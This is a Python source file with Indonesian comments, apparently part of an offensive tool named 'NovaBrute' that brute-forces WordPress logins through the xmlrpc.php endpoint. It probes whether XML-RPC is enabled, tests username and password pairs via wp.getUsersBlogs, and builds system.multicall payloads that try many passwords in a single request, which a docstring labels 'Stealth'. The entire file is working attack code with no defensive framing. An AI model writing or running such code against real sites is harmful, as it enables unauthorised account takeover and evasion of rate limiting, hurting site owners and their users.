import httpx
import xml.etree.ElementTree as ET
from typing import List, Dict

class NovaBrute:
    def __init__(self, requester):
        self.requester = requester

    async def check_xmlrpc(self, url: str) -> bool:
        """Cek apakah XML-RPC merespon request kita."""
        xml_payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
        try:
            resp = await self.requester.fetch(f"{url.rstrip('/')}/xmlrpc.php", method="POST", data=xml_payload)
            return resp.status_code == 200 and "wp.getUsersBlogs" in resp.text
        except:
            return False

    async def test_credential(self, url: str, username: str, password: str) -> bool:
        """Tes satu pasang kredensial."""
        xml_payload = f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password}</value></param></params></methodCall>"""
        try:
            resp = await self.requester.fetch(f"{url.rstrip('/')}/xmlrpc.php", method="POST", data=xml_payload)
            if "isAdmin" in resp.text or "blogid" in resp.text:
                return True
            return False
        except:
            return False

    def build_multicall_payload(self, username: str, passwords: List[str]) -> str:
        """Membangun payload untuk mengecek banyak password sekaligus (Stealth)."""
        payload = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
        for pw in passwords:
            payload += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{username}</string></value><value><string>{pw}</string></value></data></array></value></member></struct></value>'
        payload += '</data></array></value></param></params></methodCall>'
        return payload

